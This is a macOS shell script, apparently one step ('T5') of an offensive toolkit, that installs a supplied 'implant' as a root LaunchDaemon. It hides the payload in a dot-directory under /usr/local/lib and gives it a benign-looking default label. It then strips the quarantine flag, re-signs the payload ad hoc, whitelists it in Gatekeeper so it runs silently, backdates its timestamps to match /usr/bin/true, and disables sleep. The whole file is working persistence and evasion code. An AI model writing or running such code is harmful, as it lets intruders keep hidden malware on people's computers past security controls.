#!/bin/sh
# T5 — macOS root persistence: LaunchDaemon + hidden payload under /usr/local/lib.
# usage: sudo install-daemon.sh <implant-path> [label]
# Requires root. Ad-hoc re-signs and strips quarantine.
set -eu

[ "$(id -u)" = "0" ] || { echo "run as root" >&2; exit 1; }
PAYLOAD="${1:?usage: install-daemon.sh <implant-path> [label]}"
LABEL="${2:-io.fleet.agent}"

DIR="/usr/local/lib/.${LABEL}"
mkdir -p "$DIR"
DEST="$DIR/$LABEL"
cp "$PAYLOAD" "$DEST"
chmod 0755 "$DEST"
chown root:wheel "$DEST"

# quarantine stripped, ad-hoc re-sign after any modification
xattr -dr com.apple.quarantine "$DEST" 2>/dev/null || true
xattr -dr com.apple.quarantine "$DIR" 2>/dev/null || true
if command -v codesign >/dev/null 2>&1; then
    codesign --force -s - "$DEST" >/dev/null 2>&1 || true
fi
# Whitelist in the system policy so Gatekeeper does not prompt on launch
# (root-only; silent execution without user right-click -> Open approval).
spctl --add "$DEST" >/dev/null 2>&1 || true
spctl --add "$DIR" >/dev/null 2>&1 || true

# match the timestamps of a ubiquitous signed system binary
SRC="/usr/bin/true"
if [ -f "$SRC" ]; then
    touch -r "$SRC" "$DEST" 2>/dev/null || true
fi

# stay awake: prevent sleep / lid-close sleep / disk sleep (root context).
pmset -a sleep 0 >/dev/null 2>&1 || true
pmset -a disablesleep 1 >/dev/null 2>&1 || true
pmset -a disksleep 0 >/dev/null 2>&1 || true
caffeinate -s >/dev/null 2>&1 &

PLIST="/Library/LaunchDaemons/${LABEL}.plist"
cat > "$PLIST" <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
  <key>Label</key><string>${LABEL}</string>
  <key>ProgramArguments</key><array><string>${DEST}</string></array>
  <key>RunAtLoad</key><true/>
  <key>KeepAlive</key><true/>
</dict></plist>
EOF
chown root:wheel "$PLIST"
chmod 0644 "$PLIST"

launchctl unload "$PLIST" >/dev/null 2>&1 || true
launchctl load "$PLIST" >/dev/null 2>&1 || true
echo "installed LaunchDaemon ${LABEL} -> ${DEST}"
